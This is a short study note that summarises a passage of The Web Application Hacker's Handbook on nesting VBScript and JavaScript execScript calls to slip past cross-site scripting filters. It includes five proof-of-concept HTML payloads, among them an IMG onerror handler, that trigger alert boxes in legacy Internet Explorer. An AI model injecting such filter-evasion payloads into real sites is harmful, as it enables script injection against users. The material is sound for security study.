# Combining VBScript and JavaScript

## What it is

These notes show how VBScript and JavaScript can call into each other.

## When it applies

Use this when you need to layer script execution techniques or work around filters by switching between VBScript and JavaScript.

## Example

```html
<script>execScript("MsgBox 1","vbscript");</script>
<script language=vbs>execScript("alert(1)")</script>
<script>execScript('execScript "alert(1)","javascript"',"vbscript");</script>
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)")) </SCRIPT>
<IMG ONERROR="VBS:EXECSCRIPT LCASE('ALERT(1)')" SRC=A>
```

The original note explains that you can call into VBScript from JavaScript, and vice versa, and even nest these calls to "ping-pong" between the languages. It also points out that VBScript is case-insensitive, so you can construct a command in VBScript with the required case and then execute it using JavaScript.

## Notes

This page fixes the original filename typo ("nd" to "and") while keeping the content intact.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 12525-12536). Wiley. Kindle Edition.
